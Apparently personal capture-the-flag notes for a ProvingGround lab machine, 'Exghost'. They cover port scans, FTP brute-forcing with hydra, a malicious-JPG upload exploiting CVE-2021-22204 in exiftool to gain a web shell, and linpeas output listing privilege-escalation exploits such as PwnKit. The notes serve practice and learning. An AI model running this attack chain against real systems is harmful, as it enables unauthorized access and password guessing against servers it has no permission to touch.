---
tags: [ProvingGround]
---

Exghost 5/20/25

-----------------------------

## 1. sudo nmap -p- -sC- sV -Pn -n --open 192.168.208.183 -oN nmap/initial // All ports, default scripts, Probe open p>

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
Service Info: Host: 127.0.0.1; OS: Unix

## 2. sudo nmap -sU -p- 192.168.208.183 -oN nmap/udp-all

## 3. Tried ftp anonymous login and ran nmap -p 21 --script ftp-* 192.168.208.183
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 09:54 MDT

NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for 192.168.208.183
Host is up (0.076s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute:
|   Accounts: No valid accounts found
|_  Statistics: Performed 3421 guesses in 601 seconds, average tps: 5.6


## 3. gobuster dir -u http://192.168.208.183 -w /usr/share/seclists/Discovery/Web-Content/common.txt

===============================================================
[+] Url:                     http://192.168.208.183
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s

/uploads              (Status: 301) [Size: 320] [--> http://192.168.208.183/uploads/]

## 4.hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.208.183 -f -t 26

found user:system

## 5. Found file called backup that according the chatgpt is a pcap.
## 6. Opened in Wireshark and saw an http post to http://192.168.208.183/exiftest.php. Looks like the post takes a jpg and runs exif and returns data.
## 7. Used CVE-2021-22204-exiftool to create a malicious jpg.
## 8. Uploaded malicious file using this command

```bash
curl -v -X POST http://192.168.208.183/exiftest.php \
```
-F "myFile=@/home/kali/ProvingGround/Exghost/exploit/CVE-2021-22204-exiftool/image.jpg"

## 9. Whoami www-data
## 10. Ran linpeas

Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
```bash
cat: write error: Broken pipe
```
```bash
cat: write error: Broken pipe
```
[+] [CVE-2022-2586] nft_object UAF

Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
Exposure: probable
Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
Exposure: probable
Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
Exposure: probable
Tags: mint=19,[ ubuntu=18|20 ], debian=10
Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
Exposure: probable
Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
Exposure: probable
Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
Exposure: less probable
Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

Details: https://seclists.org/oss-sec/2017/q1/184
Exposure: less probable
Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


Vulnerable to CVE-2021-3560

## 11. CVE-2021-4034 stood out. Found python exploit https://github.com/joeammond/CVE-2021-4034
